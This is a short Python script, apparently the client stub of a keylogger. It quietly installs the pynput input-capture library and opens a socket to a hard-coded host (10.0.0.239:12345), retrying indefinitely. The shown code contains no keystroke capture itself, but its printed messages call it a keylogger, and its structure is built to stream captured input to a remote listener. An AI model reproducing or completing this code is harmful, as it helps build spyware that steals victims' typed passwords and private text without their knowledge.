import socket
import time
import subprocess

def install_pynput():
    try:
        subprocess.check_output(['pip', 'show', 'pynput'], stderr=subprocess.STDOUT)
        print("pynput library is already installed.")
    except subprocess.CalledProcessError:
        print("Installing pynput library...")
        try:
            subprocess.run(['pip', 'install', 'pynput'], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT, check=True)
            print("pynput library installed successfully.")
        except subprocess.CalledProcessError:
            print("Error installing the 'pynput' library.")
def connect_to_server(server_ip, server_port):
    try:
        global client_socket
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        client_socket.connect((server_ip, server_port))
        print(f"Connected to server at {server_ip}:{server_port}")
    except ConnectionRefusedError:
        print(f"Failed to connect to the server at {server_ip}:{server_port}. Retrying...")
        time.sleep(5)
        connect_to_server(server_ip, server_port)
    except KeyboardInterrupt:
        print("Terminating keylogger.")
        if client_socket:
            client_socket.close()
    except Exception as e:
        print(f"Error connecting to the server: {e}")
        if client_socket:
            client_socket.close()


def main():
    install_pynput()
    server_ip = '10.0.0.239'
    server_port = 12345

    connect_to_server(server_ip, server_port)

if __name__== "__main__":
    main()